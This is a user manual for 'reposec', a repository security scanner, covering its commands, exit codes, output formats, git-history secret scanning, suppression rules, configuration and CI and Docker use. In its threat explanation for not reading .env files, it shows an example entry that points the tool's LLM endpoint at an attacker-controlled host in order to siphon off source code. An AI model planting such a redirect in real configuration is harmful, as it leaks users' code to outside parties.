# The `reposec` manual

Everything the command-line tool does, what each flag is for, and what to do
when something does not work.

- [Install](#install)
- [Commands](#commands)
  - [`reposec scan`](#reposec-scan)
  - [`reposec doctor`](#reposec-doctor)
  - [`reposec install-eslint`](#reposec-install-eslint)
- [Exit codes](#exit-codes)
- [Output formats](#output-formats)
- [Reading a finding](#reading-a-finding)
- [Scanning git history](#scanning-git-history)
- [Suppressing known findings](#suppressing-known-findings)
- [Configuration](#configuration)
- [Using it in CI](#using-it-in-ci)
- [Docker](#docker)
- [Large repositories](#large-repositories)
- [Troubleshooting](#troubleshooting)

---

## Install

**There is no published package yet.** Run it from a clone:

```bash
git clone https://github.com/toosh-legacy/github-py-review.git
cd github-py-review

python3 -m venv .venv && source .venv/bin/activate   # Windows: .\.venv\Scripts\Activate.ps1
pip install -e .                                      # or: pip install -e ".[llm]"
```

Python 3.12 or 3.13. `-e` is an editable install, so the `reposec` command runs
your working tree and edits take effect without reinstalling. Without any
install, `python -m reposec` works from the repository root.

Python scanning works immediately. JavaScript and TypeScript scanning needs
Node.js on your PATH plus a one-time install:

```bash
reposec install-eslint
```

Confirm what is active before you trust a clean result:

```bash
reposec doctor
```

See [the README](../README.md#run-it-locally) for the full first-run walkthrough,
including Windows specifics. When the package is eventually published,
`pip install repo-security-scanner` will replace the clone step and nothing else
in this manual changes.

---

## Commands

### `reposec scan`

```
reposec scan [PATH] [options]
```

`PATH` defaults to the current directory.

#### Options

| Flag | Default | What it does |
|---|---|---|
| `--history` | off | Also walk git history for secrets that were committed and later deleted |
| `--max-commits N` | `1000` | How far back `--history` walks |
| `--fail-on {high,medium,low}` | off | Exit `1` if any finding is at or above this severity |
| `--strict` | off | Exit `3` if any detector could not run |
| `--format {text,json,sarif}` | `text` | Output format |
| `--offline` | off | Skip the OSV lookup entirely; the dependency detector reports itself degraded |
| `--no-triage` | off | Skip the LLM stage even if one is configured |
| `--max-file-bytes N` | `400000` | Skip any single file larger than this |
| `--max-total-bytes N` | `268435456` | Stop reading once the tree exceeds this, and report how much was skipped |
| `--no-color` | off | Disable ANSI colour (also honours `NO_COLOR`) |

#### Examples

```bash
reposec scan .                                  # the working tree
reposec scan . --history                        # + everything ever committed
reposec scan ../other-project --fail-on high    # gate on high findings
reposec scan . --format sarif > reposec.sarif   # for GitHub's Security tab
reposec scan . --offline --no-triage            # fully air-gapped
reposec scan . --history --strict --fail-on medium   # the strictest useful gate
```

### `reposec doctor`

Reports which detectors can actually run here, and what to do about the ones
that cannot. Always exits `0` — a missing detector is a warning, not a failure.

```console
$ reposec doctor

reposec doctor

  [ok  ] secrets                built in — regex fingerprints + entropy
  [ok  ] dependencies           OSV over HTTPS (package names only)
  [ok  ] code (python)          bandit
  [MISS] code (js/ts)           not installed — run `reposec install-eslint`
  [MISS] triage (llm)           no model configured — triage skipped

  reposec 1.1.0
```

Run this first on any new machine or image. A scanner that quietly covers half
of what you think it does is the failure this command exists to prevent.

### `reposec install-eslint`

Installs `eslint-plugin-security` into a directory you own — by default
`$XDG_DATA_HOME/reposec/eslint`, or `~/.local/share/reposec/eslint`.

```bash
reposec install-eslint                 # the default location
reposec install-eslint --dir /opt/rs   # somewhere else
```

Requires Node.js and npm. If you use `--dir`, the command prints the
`REPOSEC_ESLINT_DIR` line you need to export so the scanner can find it.

> It installs to a user-owned location rather than into the installed Python
> package, because that package is root-owned on a distro Python and read-only
> in a container image — and where it does work, `npm install` leaves hundreds
> of untracked directories inside something `pip uninstall` will not clean up.

---

## Exit codes

These are the CI contract and they are stable.

| Code | Meaning |
|---|---|
| `0` | Scan completed; nothing at or above `--fail-on` |
| `1` | Findings at or above `--fail-on` |
| `2` | Usage error — bad path, bad arguments, bad configuration |
| `3` | A detector could not run, and `--strict` was given |

Two design decisions worth knowing:

- **Findings outrank degradation.** When a run has both a leaked credential and
  a missing linter, the exit code names the credential. The degradation is still
  printed.
- **A crash never returns `1`.** An unexpected error exits `2`, because CI
  treats "this build has a vulnerability" and "this tool broke" completely
  differently, and they must not be indistinguishable.

---

## Output formats

### `text` (default)

Human-readable, coloured when attached to a terminal. Honours `NO_COLOR`.

```
3 findings (1 high, 2 medium, 0 low): 1 exposed secret, 2 unsafe code patterns.
128 file(s) scanned, 4 skipped, 12 suppressed
  ! code(js): eslint-plugin-security not installed — run `reposec install-eslint`

HIGH   KEY  app/config/aws.py:14
       AWS access key id  [aws-access-key-id via gitleaks-regex]
       evidence: AKI********C4M (20 chars)
       An AWS access key id in source grants whatever the associated identity
       can do, to anyone who can read the repository.
       fix: Rotate the key in IAM, then load it from the environment.
```

### `json`

The complete `SecurityReport`, including counts, degraded notes, timings, and
every field of every finding. Stable field names; use this for tooling.

```bash
reposec scan . --format json | jq '.findings[] | select(.severity=="high")'
```

### `sarif`

SARIF 2.1.0, for GitHub code scanning. Findings appear in the Security tab and
as pull-request annotations rather than only in a CI log. Degraded detectors are
included as tool notifications, so a partial scan is visible there too.

---

## Reading a finding

```
HIGH   KEY  app/config/aws.py:14
       ^^^  ^^^^^^^^^^^^^^^^^^^^
       │    └── file:line
       └── category: KEY = secret · DEP = dependency · COD = unsafe code

       AWS access key id  [aws-access-key-id via gitleaks-regex]
       ^^^^^^^^^^^^^^^^^   ^^^^^^^^^^^^^^^^^     ^^^^^^^^^^^^^^
       title               rule id                which detector fired
```

**Evidence is always redacted.** `AKI********C4M (20 chars)` — enough to locate
the value, never enough to use it. This holds for every output path, including
findings quoted by bandit and eslint, which do print raw source lines.

**Severities.** `high` means exploitable now or a live credential. `medium` is
real but conditional. `low` is worth knowing about. Two contexts *downgrade* a
severity rather than dropping the finding:

- **documentation** (`docs/`, `*.md`, `*.rst`) — a high-entropy value next to a
  secret-looking name is usually an illustration
- **test trees** (`tests/`, `spec/`, `__tests__/`, `fixtures/`) — the same, for
  fixtures

In both cases the finding says why it was downgraded. Provider fingerprints are
never downgraded: an `AKIA…` in a test file is a live AWS key.

---

## Scanning git history

```bash
reposec scan . --history
```

A credential committed and later deleted is still in the repository. Anyone who
clones it can read it, and unless it was rotated it is still live. **A
working-tree scan cannot see a single one of them.**

Findings name the commit, author and date that introduced the secret, because
"live for two years" and "added yesterday" call for different responses. A
credential committed, reverted, and re-added is reported once, anchored to the
earliest commit.

Requirements and caveats:

- Needs real history. In CI set `fetch-depth: 0` on your checkout, or the
  default shallow clone gives it nothing to walk.
- `--max-commits` bounds the walk (default 1000). Hitting the bound is reported.
- History findings are suppressed by `.secscanignore` like everything else, so a
  fixture you have already dismissed does not reappear through its commits.
- **Finding a secret in history means rotate it.** Removing it from history is a
  separate, disruptive operation (`git filter-repo`), and it does not help if
  someone already cloned. Rotate first.

---

## Suppressing known findings

Real repositories contain credential-shaped strings on purpose: documented
example tokens, test fixtures, deliberately vulnerable sample code. Put a
`.secscanignore` at the repository root:

```
# Format:  <path glob>[:<rule id>]   — either half may be omitted.

docs/**                        # every finding under docs/
tests/**:github-pat            # one rule, only under tests/
:B101                          # one rule, everywhere
src/fixtures/sample.env        # one file, every rule
```

Matched findings are **dropped**, not flagged — a report you have to mentally
filter is the thing this prevents. The count still appears as `suppressed` in
every output format, so a file that silences everything remains visible.

Prefer the narrowest rule that works. `src/config.py:B104` keeps every other
rule live in that file; `src/**` does not.

---

## Configuration

Everything is environment variables. **Nothing is required** — detection is
deterministic and a model only affects triage.

| Variable | Default | Purpose |
|---|---|---|
| `LLM_BACKEND` | `auto` | `auto` · `local` · `openai` · `mock` |
| `LOCAL_LLM_BASE_URL` | — | An OpenAI-compatible endpoint, e.g. `http://localhost:11434/v1` |
| `LOCAL_LLM_MODEL` | `qwen2.5-coder:3b` | Model name for the local server |
| `OPENAI_API_KEY` | — | Enables the hosted backend |
| `OPENAI_MODEL` | `gpt-5-codex` | Hosted model id |
| `SECURITY_TRIAGE` | `true` | Turn the LLM stage off entirely |
| `SECURITY_OFFLINE` | `false` | Skip OSV; dependencies report as degraded |
| `REPOSEC_ESLINT_DIR` | — | Where the eslint install lives, if not a default location |
| `REPOSEC_ENV_FILE` | — | Opt in to reading a `.env` file (see below) |
| `NO_COLOR` | — | Disable colour |

### Choosing a triage backend

| Goal | Set |
|---|---|
| No model (default) | nothing — detection runs, triage is skipped |
| Fully local | `LLM_BACKEND=local`, `LOCAL_LLM_BASE_URL=http://localhost:11434/v1` |
| Hosted | `LLM_BACKEND=openai`, `OPENAI_API_KEY=sk-…` |

Triage prompts contain source code. Credentials are redacted before a prompt is
built, but `LLM_BACKEND=local` keeps everything on your machine.

### Why `.env` is not read by default

The documented way to run this is `cd myrepo && reposec scan .` — and that
repository is **untrusted input**. A `.env` in it containing
`LOCAL_LLM_BASE_URL=http://attacker.example/v1` would silently redirect every
triage prompt, source included, to a server its author chose. One containing
`OPENAI_API_KEY` would spend your quota somewhere else. And `.env` is precisely
the file a secret scanner gets pointed at.

Set `REPOSEC_ENV_FILE=.env` if you are working *on* this project and want the
old behaviour. Otherwise use environment variables.

---

## Using it in CI

Until the package is published, CI has to install it from git. Every recipe
below uses that form; swap it for `pip install repo-security-scanner` once a
release exists and nothing else changes.

### GitHub Actions

```yaml
- uses: actions/checkout@v4
  with:
    fetch-depth: 0                    # --history needs real history

- run: pip install "git+https://github.com/toosh-legacy/github-py-review@main"
- run: reposec install-eslint          # only if you scan JS/TS
- run: reposec scan . --history --fail-on high
```

Pin to a tag or commit rather than `@main` for anything you need to be
reproducible — `@v1.1.0` once that tag exists.

Findings in the Security tab instead of a log nobody reads:

```yaml
- run: reposec scan . --history --format sarif > reposec.sarif
  if: always()
- uses: github/codeql-action/upload-sarif@v3
  if: always()
  with:
    sarif_file: reposec.sarif
```

### GitLab CI

```yaml
security-scan:
  image: python:3.13-slim
  before_script:
    - pip install "git+https://github.com/toosh-legacy/github-py-review@main"
  script:
    - reposec scan . --fail-on high --no-color
```

Set `GIT_DEPTH: 0` if you want `--history`.

### pre-commit

```yaml
repos:
  - repo: local
    hooks:
      - id: reposec
        name: reposec
        entry: reposec scan . --fail-on high --no-color
        language: system
        pass_filenames: false
```

### Picking a gate

| You want | Use |
|---|---|
| Block only on what is certainly exploitable | `--fail-on high` |
| Block on anything real | `--fail-on medium` |
| Also block when the scan was incomplete | add `--strict` |
| Report without blocking | no `--fail-on` (always exits 0) |

Add `--strict` once your image reliably has every detector. Before that it will
fail builds for a missing linter, and people will remove the whole step.

---

## Docker

No image is published, so build it from the clone:

```bash
docker build -f deploy/Dockerfile -t reposec:local .

docker run --rm -v "$PWD:/repo:ro" reposec:local scan /repo --history
```

- **Read-only mount.** The scanner never writes to your repository.
- The image ships bandit, eslint-plugin-security, Node and git. It **fails to
  build** if any of them cannot run, rather than shipping a half-scanner — so a
  green build is a working scanner, not just the right files.
- It runs as uid `10001`, not root. Git normally refuses to read a repository it
  thinks belongs to someone else, which would make `--history` silently find
  nothing; the image configures `safe.directory` so it does not.

Platform notes: on Windows PowerShell use `-v "${PWD}:/repo:ro"`; in Git Bash,
prefix with `MSYS_NO_PATHCONV=1` or it rewrites `/repo` into a Windows path.

Once images are published to GHCR the run command becomes
`docker run --rm -v "$PWD:/repo:ro" ghcr.io/toosh-legacy/github-py-review:v1.1.0 scan /repo`,
and everything else here is unchanged.

---

## Large repositories

Two bounds exist, and both report themselves when reached.

- `--max-file-bytes` (default 400 KB) skips individual large files — usually
  minified bundles and generated code.
- `--max-total-bytes` (default 256 MB) stops the read once the whole tree
  exceeds it. The tree is held in memory and the code detector builds a second
  filtered copy, so peak use is roughly twice this number.

Reaching either prints how many files went unscanned, and `--strict` turns that
into exit `3`. Reporting "scanned the first 256 MB" is honest; being OOM-killed
is not.

The analyzers are chunked (2,000 Python files, 1,000 JS files per invocation),
so one timeout costs one chunk rather than every finding in that language.
Vendored directories — `node_modules`, `.venv`, `vendor`, `dist` — are pruned
during the walk, not filtered afterwards.

---

## Troubleshooting

**`doctor` says `code (js/ts)` is missing.**
Run `reposec install-eslint`. If you installed with `--dir`, export
`REPOSEC_ESLINT_DIR=<that directory>`. If Node is not on your PATH, install
Node.js — there is no way around it, and the scanner falls back to narrower
regex checks and says so.

**`--history` found nothing in CI.**
Set `fetch-depth: 0` (GitHub) or `GIT_DEPTH: 0` (GitLab). A shallow clone has no
history to walk.

**Every dependency reports as "unresolved".**
Your manifest declares ranges rather than pinned versions. The scanner reports
unresolved ranges rather than guessing which version you would get. Commit a
lockfile.

**"OSV unreachable".**
Network, proxy, or rate limit. The dependency detector degrades rather than
returning a false all-clear. Use `--offline` to make it explicit, and note that
`--strict` will then exit `3`.

**Too many findings from one rule.**
Add it to `.secscanignore` scoped as narrowly as you can — `path/**:rule-id`.
If it is noisy everywhere, that is worth reporting as an issue.

**Exit code 2 with a pydantic error.**
A malformed environment variable, e.g. `LLM_BACKEND=Local` (it is lowercase).
The message names the field.

**A scan is slower than expected.**
The analyzers are ~95% of wall time. `--offline` removes network latency;
`--no-triage` removes the model. Neither changes what is detected.

---

## See also

- [`README.md`](../README.md) — what it does and why it is shaped this way
- [`docs/GUIDE.md`](GUIDE.md) — a guided tour of the codebase
- [`SECURITY.md`](../SECURITY.md) — what the scanner does with your code
- [`docs/RELEASE.md`](RELEASE.md) — how a version ships
